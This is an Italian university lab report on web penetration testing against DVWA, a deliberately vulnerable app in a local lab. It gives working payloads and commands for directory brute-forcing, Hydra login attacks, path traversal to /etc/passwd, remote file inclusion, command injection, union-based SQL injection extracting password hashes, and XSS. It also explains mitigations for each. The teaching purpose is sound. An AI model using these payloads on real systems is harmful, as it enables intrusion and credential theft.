# **Relazione di Laboratorio: Web Security**

**Corso:** Laboratorio di Sicurezza Informatica
**Docenti:** Andrea Melis, Marco Prandini
**Dipartimento:** Informatica – Scienza e Ingegneria, Alma Mater Studiorum – Università di Bologna
**Obiettivo:** Condurre una simulazione di penetration testing completa su un'applicazione web vulnerabile (DVWA), coprendo le fasi di enumerazione dei contenuti, brute-force dell'autenticazione, file inclusion, command injection, SQL injection e Cross-Site Scripting (XSS), unendo metodologia offensiva alla comprensione delle vulnerabilità OWASP Top Ten.

---

## **Fase 0: Predisposizione dell'Ambiente**

Prima di avviare qualsiasi attività offensiva è indispensabile configurare il laboratorio in modo isolato e riproducibile.

**Azione Pratica:**

1. Dalla macchina attaccante (Parrot Security), accedere alla directory del framework `pentestlab`, già presente nella home o scaricabile con:
   ```bash
   git clone https://github.com/eystsen/pentestlab.git
   cd pentestlab
   ```
2. Verificare che nessun servizio occupi già la porta 80 (es. nginx):
   ```bash
   sudo ss -tulpn
   # Se presente: sudo service nginx stop
   ```
3. Visualizzare le applicazioni vulnerabili disponibili:
   ```bash
   ./pentestlab.sh --list
   ```
4. Avviare **DVWA** (Damn Vulnerable Web Application):
   ```bash
   ./pentestlab.sh start dvwa
   ```
   Il primo avvio richiederà alcuni secondi per il pull dell'immagine Docker. Al termine, l'applicazione sarà raggiungibile dal browser all'indirizzo `http://dvwa`.

5. Accedere con le credenziali di default `admin` / `password`, navigare su **Setup** per inizializzare il database, quindi portarsi su **DVWA Security** e impostare il livello di difficoltà su **"low"**.

**Approfondimento Teorico:**

* **Pentestlab e Docker:** Il framework `pentestlab` non è altro che un insieme di script shell che orchestrano container Docker pre-configurati con applicazioni web deliberatamente vulnerabili. Docker consente di isolare ciascuna applicazione nel proprio ambiente, garantendo riproducibilità e rapida dismissione del target senza alterare il sistema host.
* **DVWA (Damn Vulnerable Web Application):** È un'applicazione PHP/MySQL progettata esplicitamente per l'addestramento alla web security. Supporta diversi livelli di difficoltà (low, medium, high, impossible) che modificano progressivamente i filtri applicati all'input, permettendo di osservare come difese incrementali limitino o annullino le tecniche di attacco.
* **Perché livello "low"?** A questo livello nessuna sanitizzazione è applicata all'input, rendendo immediatamente visibili le vulnerabilità nella loro forma più pura. È il punto di partenza ideale per comprendere il meccanismo di ogni attacco prima di affrontare le contromisure.

---

## **Fase 1: Web Content Discovery (Enumerazione dei Contenuti)**

Una volta localizzato il server target, si procede all'enumerazione dei contenuti web: l'obiettivo è scoprire risorse (directory, file, API, sottodomini) che non sono esplicitamente linkate nell'applicazione ma che risultano accessibili sul server.

**Azione Pratica:**

Utilizzare `gobuster` con una wordlist esaustiva. Le wordlist di **SecLists** sono presenti su Parrot in `/usr/share/wordlists/`:

```bash
gobuster dir \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
  -u http://dvwa
```

Un esempio di output atteso:

```
[+] Mode         : dir
[+] Url/Domain   : http://dvwa/
[+] Threads      : 10
[+] Wordlist     : SecLists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s

/.htpasswd   (Status: 403)
/.svn        (Status: 301)
/cgi-bin/    (Status: 403)
/config      (Status: 301)
/favicon.ico (Status: 200)
/phpmyadmin  (Status: 301)
/robots.txt  (Status: 200)
```

**Approfondimento Teorico:**

* **Gobuster:** È uno strumento di directory/file bruteforcing scritto in Go, che invia richieste HTTP GET per ciascuna voce della wordlist e classifica le risorse in base al codice di risposta HTTP ricevuto. A differenza di tool basati su scansione del DOM, agisce "alla cieca" senza analizzare il contenuto delle pagine.
* **SecLists:** È una raccolta sistematicamente curata da Daniel Miessler di wordlist utili al penetration testing (username, password, URI, payload di injection, ecc.). La `big.txt` contiene decine di migliaia di percorsi comunemente presenti su server web.
* **Interpretazione dei codici HTTP:**
  * `200 OK` → risorsa esistente e accessibile.
  * `301 Moved Permanently` → redirect (la risorsa esiste, ma si trova altrove).
  * `403 Forbidden` → risorsa esistente, ma accesso negato: informazione preziosa da annotare.
  * `404 Not Found` → risorsa assente (gobuster la filtra per default).
* **Cosa rivela la scansione?** La presenza di `/phpmyadmin` indica un pannello di amministrazione del database potenzialmente raggiungibile via browser; `.svn` segnala che il repository di versione del codice sorgente è stato accidentalmente deployato sul server, esponendo l'intera history del progetto; `robots.txt` può contenere direttive che elenco esplicito di percorsi "da non indicizzare" (paradossalmente, un inventario di risorse sensibili).

---

## **Fase 2: Brute Force dell'Autenticazione**

Con l'applicazione configurata al livello "low", la form di login della sezione **Brute Force** di DVWA non implementa alcuna protezione contro tentativi ripetuti (no rate limiting, no CAPTCHA, no account lockout). Questo la rende vulnerabile a un attacco dizionario.

### 2.1 Intercettazione della Richiesta con Burp Suite

Prima di lanciare il brute force automatico, è necessario comprendere la struttura esatta della richiesta HTTP di autenticazione.

**Azione Pratica:**

1. Aprire **Burp Suite Community Edition** dal menu "Other" della macchina Parrot.
2. Accettare le impostazioni di default e aprire un "Temporary Project".
3. Configurare il browser per instradare il traffico attraverso il proxy locale di Burp (di default `127.0.0.1:8080`).
4. Attivare l'intercettazione in `Proxy → Intercept → Intercept is on`.
5. Inviare una richiesta di test alla form (`prova` / `prova`) e osservare la richiesta catturata in Burp.

La richiesta intercettata avrà una forma simile a:

```http
GET /vulnerabilities/brute/index.php?username=prova&password=prova&Login=Login HTTP/1.1
Host: dvwa
Cookie: security=low; PHPSESSID=f0q0t1rfcj64klid5qh6uhpds4
```

**Approfondimento Teorico:**

* **Burp Suite come Web Proxy:** Burp si posiziona tra il browser e il server, intercettando ogni richiesta e risposta HTTP. Consente di esaminare, modificare e ri-inviare le richieste, rendendolo uno strumento fondamentale in ogni fase del web pentesting. Le funzionalità principali sono: **Proxy** (intercettazione), **Repeater** (re-invio manuale di richieste modificate), **Intruder** (attacchi automatizzati), **HTTP History** (revisione di tutto il traffico), **Decoder** (codifica/decodifica di payload).
* **Perché il metodo GET?** DVWA al livello "low" usa parametri in querystring anziché nel corpo della richiesta POST, semplificando la manipolazione manuale ma rendendo l'attacco facilmente osservabile nei log del server e nella history del browser.
* **Il cookie di sessione:** Il parametro `PHPSESSID` identifica la sessione autenticata (in questo caso quella dell'attaccante su DVWA). Hydra dovrà includerlo in ogni richiesta, perché senza un cookie di sessione valido il server redirige alla pagina di login principale, rendendo le risposte non analizzabili.

### 2.2 Attacco con Hydra

Nota la struttura della richiesta, si può automatizzare il brute force con **Hydra**.

**Azione Pratica:**

```bash
hydra $IP_CONTAINER_DVWA \
  -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100.txt \
  http-get-form \
  "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=f0q0t1rfcj64klid5qh6uhpds4"
```

Output atteso al termine dell'attacco:

```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1700 login tries (l:17/p:100)
[80][http-get-form] host: 192.168.56.5  login: admin  password: password
```

**Approfondimento Teorico:**

* **Hydra:** È uno strumento di brute force per protocolli di rete (SSH, FTP, HTTP, SMB, ecc.). Il modulo `http-get-form` richiede tre elementi separati da `:`: il path della risorsa, la stringa dei parametri con i segnaposto `^USER^` e `^PASS^`, e la stringa di testo che indica un tentativo *fallito* (failure string). Hydra inferisce il successo dall'assenza di questa stringa nella risposta.
* **Wordlist e attacco dizionario:** Anziché provare ogni combinazione alfanumerica (attacco esaustivo), si sfruttano liste di username e password statisticamente frequenti. Le credenziali `admin`/`password` compaiono in quasi tutte le wordlist note, riflettendo una misconfiguration A07 (Identification and Authentication Failures) di OWASP.
* **CeWL – Custom Wordlist Generator:** Per scenari più mirati, lo strumento `cewl` genera wordlist a partire dal testo di un sito web specifico, estraendo parole di lunghezza minima configurabile:
  ```bash
  cewl -d 1 -m 5 https://ulisse.unibo.it
  ```
  Il flag `-d 1` limita il crawling a profondità 1, `-m 5` impone una lunghezza minima di 5 caratteri. Questo approccio è utile quando la password potrebbe essere legata al contesto dell'organizzazione bersaglio (nomi di prodotti, termini tecnici, ecc.).

---

## **Fase 3: File Inclusion (LFI/RFI)**

La sezione **File Inclusion** di DVWA espone una vulnerabilità in cui il parametro `page` della GET viene utilizzato direttamente come argomento di inclusione PHP, senza alcuna validazione o restrizione del percorso.

### 3.1 Local File Inclusion (LFI) e Path Traversal

**Azione Pratica:**

Navigare alla sezione "File Inclusion" dell'applicazione. L'URL assumerà la forma:
```
http://dvwa/vulnerabilities/fi/?page=include.php
```

Il codice sorgente vulnerabile (visibile tramite la funzione "View Source" di DVWA) è:

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

Nessun filtro. Per scalare la gerarchia del filesystem e leggere il file `/etc/passwd` del server, si sfrutta la sequenza `../` (**Path Traversal**):

```
http://dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

Il server risponderà con il contenuto del file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 3.2 Remote File Inclusion (RFI)

Per impostazione predefinita la RFI è disabilitata in DVWA (richiede `allow_url_include = On` nel `php.ini`), ma il principio si applica ai casi reali in cui questa opzione è attiva.

**Azione Pratica:**

1. Creare un file PHP arbitrario sulla propria macchina:
   ```php
   <?php echo '<p>Hello World</p>'; ?>
   ```
2. Servire il file tramite un web server temporaneo:
   ```bash
   python3 -m http.server 8081
   ```
3. Richiedere l'inclusione remota:
   ```
   http://dvwa/vulnerabilities/fi/?page=http://IP_PARROT:8081/test.php
   ```

Il server target scaricherà ed eseguirà il file remoto come se fosse locale.

**Approfondimento Teorico:**

* **Local File Inclusion:** Sfrutta la funzione `include()` (o `require()`, `include_once()`, `require_once()`) di PHP per leggere file sensibili del filesystem del server. È classificata come una forma di **Path Traversal** (A01 OWASP) quando permette di navigare al di fuori della directory web root. I file di interesse tipico sono: `/etc/passwd`, `/etc/shadow`, file di configurazione con credenziali, log del sistema.
* **Remote File Inclusion:** Estende il concetto alla rete: il parametro `page` può contenere una URL di un file esterno. Se il server target scarica ed esegue il file remoto, l'attaccante può ottenere **Remote Code Execution (RCE)** semplicemente ospitando un webshell PHP sulla propria macchina. Questo è il passaggio diretto dall'information gathering all'accesso completo al sistema.
* **Path Traversal:** La sequenza `../` (o i suoi encoding: `%2e%2e%2f`, `..%2f`, `%2e%2e/`) consente di risalire l'albero delle directory oltre la radice prevista dall'applicazione. Anche in presenza di filtri semplici (es. blocco di `../`), spesso si aggira tramite encoding o doppia URL-encoding.

---

## **Fase 4: Command Injection**

La sezione **Command Injection** di DVWA presenta una form che accetta un indirizzo IP e lo utilizza per eseguire un `ping`. Il codice PHP esegue il comando tramite `exec()` concatenando l'input dell'utente senza alcuna sanitizzazione.

**Azione Pratica:**

Inserire nella form input che includono operatori shell per incatenare comandi arbitrari:

```bash
# Con punto e virgola (esegue ls indipendentemente dall'esito di ping)
127.0.0.1; ls

# Con AND logico (esegue ls solo se ping ha successo)
127.0.0.1 && ls
```

Il server eseguirà entrambi i comandi e restituirà l'output nella risposta HTTP.

**Livello Medium:** A livello "medium", DVWA filtra i caratteri `&&` e `;`. Tuttavia, l'operatore `|` (pipe) e la sequenza `| ls` (con spazio) potrebbero non essere filtrati, permettendo di aggirare le difese.

**Approfondimento Teorico:**

* **Command Injection vs SQL Injection:** Entrambe appartengono alla famiglia A03 (Injection) di OWASP. La differenza fondamentale è l'interprete bersaglio: nel Command Injection è la shell del sistema operativo, nella SQL Injection è il DBMS. La gravità del Command Injection è generalmente superiore, poiché un comando shell ha accesso diretto al sistema operativo.
* **Meccanismo di concatenazione:** In bash, `;` separa comandi eseguiti sequenzialmente; `&&` esegue il secondo comando solo se il primo ha avuto successo (exit code 0); `||` esegue il secondo solo se il primo ha fallito; `|` invia lo stdout del primo come stdin del secondo. Qualsiasi carattere non filtrato dal server è sfruttabile.
* **Principio del minimo privilegio:** La corretta mitigazione prevede l'esecuzione del processo web server con un utente di sistema con i minimi privilegi necessari. Anche con una Command Injection attiva, se il web server gira come utente non privilegiato, il danno è contenuto.
* **Mitigazioni corrette:** Non concatenare mai input utente non validato in comandi shell. Utilizzare funzioni sicure come `escapeshellarg()` / `escapeshellcmd()` in PHP, o preferire API del linguaggio che non invocano una shell (es. `subprocess.run(..., shell=False)` in Python).

---

## **Fase 5: SQL Injection**

La sezione **SQL Injection** di DVWA presenta un campo di input per un ID utente, utilizzato direttamente per costruire una query SQL senza alcun meccanismo di separazione tra struttura e dati (A03 OWASP).

Il codice vulnerabile è:
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

### 5.1 SQL Injection Semplice — Alterazione della Logica

**Azione Pratica:**

Inserire come input:
```sql
' OR 'a'='a
```

La query risultante diventa:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR 'a'='a';
```

Poiché `'a'='a'` è sempre vera, la `WHERE` viene annullata e il DBMS restituisce **tutti gli utenti** del database.

### 5.2 SQL Injection Union-Based — Estrazione di Dati Arbitrari

La tecnica **Union-Based** consente di affiancare alla query originale una seconda query arbitraria, purché abbia lo stesso numero di colonne. Il procedimento è sistematizzato in più step.

**Step 1 – Determinare il numero di colonne**

Utilizzare la tecnica delle `NULL` statement: aggiungere NULL progressivamente finché non si ottiene un risultato senza errori.

```sql
' union select NULL #          -- errore: numero colonne non corrispondente
' union select NULL,NULL #     -- successo: la query originale aveva 2 colonne
```

**Step 2 – Enumerare metadati del server**

```sql
' union select NULL,@@version #   -- versione del DBMS
' union select NULL,@@hostname #  -- hostname della macchina
' union select NULL,database() #  -- nome del database corrente
```

**Step 3 – Enumerare la struttura del database tramite `information_schema`**

```sql
-- Lista di tutti gli schema (database)
' union select null,schema_name from information_schema.schemata #

-- Lista di tutte le tabelle
' union select null,table_name from information_schema.tables #

-- Tabelle dello schema 'dvwa'
' union select null,table_name from information_schema.tables where table_schema='dvwa' #

-- Colonne della tabella 'users'
' union select null,column_name from information_schema.columns where table_name='users' #
```

**Step 4 – Estrarre le credenziali**

```sql
' union select user,password from users #
```

Il server restituirà username e hash delle password per tutti gli utenti del database.

**Approfondimento Teorico:**

* **`information_schema`:** È uno schema speciale presente in MySQL/MariaDB (e con equivalenti in PostgreSQL e SQLite) che funge da "catalogo" del DBMS: contiene metadati su tutti i database, tabelle, colonne e vincoli. È il punto di partenza obbligato per qualsiasi SQL injection che voglia estrarre dati non noti a priori.
* **Union-Based vs Blind Injection:** Nella Union-Based l'output della seconda query viene visualizzato direttamente nella risposta HTTP. Quando ciò non è possibile (l'applicazione non mostra output), si ricorre alla **Blind Injection**, in cui il risultato si inferisce da indicatori indiretti:
  * *Boolean-based*: si iniettano condizioni vere/false e si osserva se la risposta cambia.
  * *Time-based*: si inietta `SLEEP(5)` e si misura il tempo di risposta.
* **Commento `#`:** In MySQL, `#` avvia un commento che annulla il resto della query originale. L'equivalente ANSI è `--` (due trattini seguiti da uno spazio). Scegliere il delimitatore corretto dipende dal DBMS target.
* **Mitigazioni — Prepared Statements:** La difesa principale è l'uso di **query parametrizzate** (prepared statements / bind variables), in cui la struttura della query è fissa e i parametri vengono passati separatamente al DBMS, che li tratta sempre come dati e mai come codice SQL:
  ```php
  $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
  $stmt->execute([$id]);
  ```

---

## **Fase 6: Cross-Site Scripting (XSS)**

XSS è una vulnerabilità di injection lato client (A03 OWASP): codice JavaScript malevolo viene iniettato in una pagina web e viene eseguito nel browser di un utente ignaro che si fida del sito. L'applicazione è vulnerabile perché non sanifica l'input prima di includerlo nell'output HTML.

### 6.1 Payload Base

Il vettore più semplice per verificare la presenza di una vulnerabilità XSS è:

```html
<script>alert("XSS")</script>
```

Se l'applicazione restituisce questo contenuto senza sanitizzarlo, il browser eseguirà lo script e mostrerà il dialog di alert.

### 6.2 Tipologie di XSS

**XSS Reflected (Non-Persistente):** Il payload è inserito nell'URL (o in un campo di form) e viene "riflesso" immediatamente nella risposta HTTP. Richiede che la vittima clicchi su un link appositamente costruito dall'attaccante (es. inviato via email o messaggistica). La sessione autenticata della vittima è il target primario.

**XSS Stored (Persistente):** Il payload viene salvato nel database del server (es. tramite un commento, un messaggio di forum, un campo profilo). Ogni utente che carica la pagina contenente il payload lo esegue involontariamente nel proprio browser, senza che l'attaccante debba interagire nuovamente. È la forma più pericolosa e scalabile.

**DOM-Based XSS:** Il payload non transita attraverso il server: è JavaScript già presente nella pagina che, processando dati controllabili dall'utente (es. `document.location.hash`, `document.cookie`), li inietta nel DOM in modo insicuro. L'analisi del codice client-side è indispensabile per individuarlo.

### 6.3 Possibili Effetti di un Attacco XSS

* **Session hijacking:** furto del cookie di sessione tramite `document.cookie` e invio a un server controllato dall'attaccante.
* **Keylogging silenzioso:** intercettazione di ogni tasto premuto dall'utente sulla pagina.
* **Phishing contestuale:** sostituzione di form legittimi con form contraffatti per sottrarre credenziali o codici OTP.
* **Redirect verso siti malevoli:** reindirizzamento della vittima verso pagine di phishing o che distribuiscono malware.
* **Banner pubblicitari non autorizzati:** inserimento di contenuti a fini commerciali.

### 6.4 Payload Avanzati e Cheat Sheet

La varietà di payload XSS validi è notevole, poiché dipende dal contesto HTML in cui viene iniettato il dato (attributo, tag, JavaScript inline, ecc.) e dal browser della vittima. Risorse di riferimento:

* **Payload list:** https://github.com/payloadbox/xss-payload-list
* **PortSwigger XSS Cheat Sheet:** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

**Approfondimento Teorico:**

* **Perché XSS è in A03 (Injection)?** Nella classificazione OWASP 2021, XSS è stato riassorbito in Injection per la sua natura fondamentale: un interprete (il motore JavaScript del browser) esegue input non fidato come codice. Tra il 2013 e il 2017 era una categoria autonoma (A7).
* **Mitigazioni:** La difesa primaria è l'**output encoding** contestuale: i caratteri speciali HTML (`<`, `>`, `"`, `'`, `&`) devono essere sostituiti con le rispettive entità HTML prima di essere inclusi nell'output. Il **Content Security Policy (CSP)** header (`Content-Security-Policy: default-src 'self'`) fornisce un secondo livello di difesa istruendo il browser a rifiutare l'esecuzione di script non provenienti da origini esplicitamente autorizzate.
* **`HttpOnly` cookie flag:** Impostando il flag `HttpOnly` sul cookie di sessione, si impedisce a JavaScript di accedervi tramite `document.cookie`, vanificando la tecnica di session hijacking più comune.

---

## **Riepilogo delle Vulnerabilità e Mitigazioni**

| Vulnerabilità | Categoria OWASP 2021 | Causa Radice | Mitigazione Principale |
|---|---|---|---|
| **Directory Discovery** | A05 – Security Misconfiguration | Risorse sensibili esposte senza controllo accessi | Rimuovere/proteggere directory non necessarie; disabilitare directory listing |
| **Brute Force Login** | A07 – Auth Failures | Assenza di rate limiting e account lockout | Rate limiting, CAPTCHA, MFA, account lockout policy |
| **LFI / Path Traversal** | A01 – Broken Access Control | Input non validato usato in `include()` | Whitelist dei file includibili; mai esporre input utente a funzioni di inclusione |
| **RFI** | A01 – Broken Access Control | `allow_url_include = On` in `php.ini` | Disabilitare `allow_url_include`; validazione input |
| **Command Injection** | A03 – Injection | Input concatenato a comandi shell | `escapeshellarg()`, uso di API senza invocazione shell, principio del minimo privilegio |
| **SQL Injection** | A03 – Injection | Costruzione dinamica di query SQL | Prepared statements / bind variables; principio del minimo privilegio DB |
| **XSS Reflected/Stored** | A03 – Injection | Output senza encoding | Output encoding contestuale; CSP header; flag `HttpOnly` sui cookie |
| **XSS DOM-Based** | A03 – Injection | JavaScript client-side processa input utente insicuramente | Evitare `innerHTML`, `document.write`; usare API DOM sicure (`textContent`) |

---

## **Risorse per l'Approfondimento**

* **Web Application Hacker's Handbook** – Stuttard, Pinto: testo di riferimento accademico e professionale.
* **PortSwigger Web Security Academy:** https://portswigger.net/web-security/all-materials — piattaforma interattiva dei creatori di Burp Suite, con laboratori guidati per ogni vulnerabilità OWASP.
* **OverTheWire – Natas:** https://overthewire.org/wargames/natas/ — wargame progressivo dedicato alla web security (ogni livello è un'applicazione vulnerabile).
* **TryHackMe:** https://tryhackme.com/ — piattaforma con percorsi guidati e macchine target.
* **Hack The Box:** https://hackthebox.eu — challenge avanzate, incluse le Web Challenges.
* **PentesterLab:** https://pentesterlab.com — esercizi pratici con focus sulla comprensione del codice sorgente vulnerabile.
* **OWASP Web Security Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/ — guida metodologica completa per il testing di sicurezza delle applicazioni web.
